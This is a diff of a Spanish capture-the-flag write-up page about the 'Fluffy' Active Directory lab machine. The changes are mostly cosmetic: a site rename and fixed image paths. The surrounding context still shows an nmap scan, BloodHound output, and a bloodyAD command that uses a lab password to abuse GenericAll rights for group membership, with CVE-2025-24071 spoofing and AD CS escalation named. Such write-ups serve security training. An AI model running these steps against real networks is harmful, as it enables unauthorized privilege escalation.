@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Fluffy | My New Hugo Site</title>
+<title>Fluffy | Borhub Blog</title>
 <meta name="keywords" content="Fluffy, Easy, ActiveDirectory, ESC16">
 <meta name="description" content="Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.">
 <meta name="author" content="Borhub">
@@ -71,7 +71,7 @@
     }
 
 </script><meta property="og:url" content="https://borhuub.github.io/writeups/fluffy/">
-  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:site_name" content="Borhub Blog">
   <meta property="og:title" content="Fluffy">
   <meta property="og:description" content="Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.">
   <meta property="og:locale" content="en-us">
@@ -133,7 +133,7 @@
   },
   "publisher": {
     "@type": "Organization",
-    "name": "My New Hugo Site",
+    "name": "Borhub Blog",
     "logo": {
       "@type": "ImageObject",
       "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
@@ -242,7 +242,7 @@
     </details>
 </div>
 
-  <div class="post-content"><p><img alt="Fluffy Machine 1" loading="lazy" src="/static/machines/fluffy/Fluffy_Machine_1.png"></p>
+  <div class="post-content"><p><img alt="Fluffy Machine 1" loading="lazy" src="/img/fluffy/Fluffy_Machine_1.png"></p>
 <h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
 <p>Escaneo de puertos abiertos:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.69 -oG ports
@@ -554,14 +554,14 @@
 </span></span><span class="line"><span class="cl">INFO: Done in 00M 17S
 </span></span><span class="line"><span class="cl">INFO: Compressing output into 20250527133042_bloodhound.zip
 </span></span></code></pre></div><p>Vemos que el bloodhound nos indica que el usuario p.agila es miembro de SERVICES ACCOUNTS MANAGER y ese grupo tiene permisos <code>genericALL</code> sobre el grupo SERVICES ACCOUNTS que tiene permisos <code>genericWrite</code> sobre 3 cuentas.</p>
-<p><img alt="Fluffy Machine 2" loading="lazy" src="/static/machines/fluffy/Fluffy_Machine_2.png"></p>
-<p><img alt="Fluffy Machine 3" loading="lazy" src="/static/machines/fluffy/Fluffy_Machine_3.png"></p>
+<p><img alt="Fluffy Machine 2" loading="lazy" src="/img/fluffy/Fluffy_Machine_2.png"></p>
+<p><img alt="Fluffy Machine 3" loading="lazy" src="/img/fluffy/Fluffy_Machine_3.png"></p>
 <h3 id="abusing-genericall---bloodyad">Abusing GenericAll - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusing-genericall---bloodyad">#</a></h3>
 <p>P.AGILA no tiene los permisos de SERVICE ACCOUNTS, así que necesitamos heredar los permisos. Para ello como p.agila tiene permisos genericALL sobre SERVICE ACCOUNTS, vamos a añadirlo al grupo mediante <code>bloodyAD</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">exegol-default /workspace $ bloodyAD --host 10.10.11.69 -d fluffy.htb -u <span class="s1">&#39;p.agila&#39;</span> -p <span class="s1">&#39;prometheusx-303&#39;</span> add groupMember <span class="s1">&#39;service accounts&#39;</span> <span class="s1">&#39;p.agila&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> p.agila added to service accounts
-</span></span></code></pre></div><p><img alt="Fluffy Machine 4" loading="lazy" src="/static/machines/fluffy/Fluffy_Machine_4.png"></p>
+</span></span></code></pre></div><p><img alt="Fluffy Machine 4" loading="lazy" src="/img/fluffy/Fluffy_Machine_4.png"></p>
 <p>Una vez p.agila es miembro del grupo SERVICE ACCOUNTS tenemos la posibilidad de realizar dos ataques.</p>
 <ul>
 <li>
@@ -1137,7 +1137,7 @@
       <li><a href="https://borhuub.github.io/tags/esc16/">ESC16</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://borhuub.github.io/writeups/administrator/administrator/">
+  <a class="prev" href="https://borhuub.github.io/writeups/administrator/">
     <span class="title">« Prev</span>
     <br>
     <span>Administrator</span>
@@ -1149,7 +1149,7 @@
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://borhuub.github.io/">My New Hugo Site</a></span> · 
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
 
     <span>
         Powered by
